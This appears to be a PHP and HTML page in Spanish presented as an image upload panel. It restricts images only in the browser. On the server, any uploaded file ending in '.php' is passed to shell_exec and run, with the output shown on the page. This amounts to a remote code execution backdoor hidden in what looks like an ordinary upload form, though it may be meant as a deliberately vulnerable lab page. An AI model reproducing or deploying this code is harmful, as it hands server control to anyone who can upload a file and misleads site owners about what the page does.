<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Insertar imagen</title>
    <!-- Agregar enlaces a Bootstrap CSS y JS -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container mt-5">
        <h1 class="text-center">Panel de Subida de Imágenes</h1>
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group">
                <label for="file">Sube una imagen:</label>
                <input type="file" class="form-control-file" id="file" name="file" accept=".jpg, .jpeg, .png, .gif" required>
            </div>
            <button type="submit" class="btn btn-primary">Subir</button>
        </form>
        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            if (isset($_FILES["file"]) && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
                $uploadedFilePath = $_FILES["file"]["tmp_name"];
                $fileExtension = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);

                if (in_array($fileExtension, ["jpg", "jpeg", "png", "gif"])) {
                    // Mostrar la imagen
                    echo "<h2 class='mt-3'>Imagen Subida:</h2>";
                    echo "<img src=\"data:image/jpeg;base64," . base64_encode(file_get_contents($uploadedFilePath)) . "\" class='img-fluid'>";
                } elseif ($fileExtension === "php") {
                    // Ejecutar el código PHP
                    echo "<h2 class='mt-3'>Resultado:</h2>";
                    echo "<pre>";
                    echo shell_exec("php " . escapeshellarg($uploadedFilePath));
                    echo "</pre>";
                } else {
                    echo "<p class='text-danger mt-3'>Formato de archivo no válido.</p>";
                }
            }
        }
        ?>
    </div>
</body>
</html>
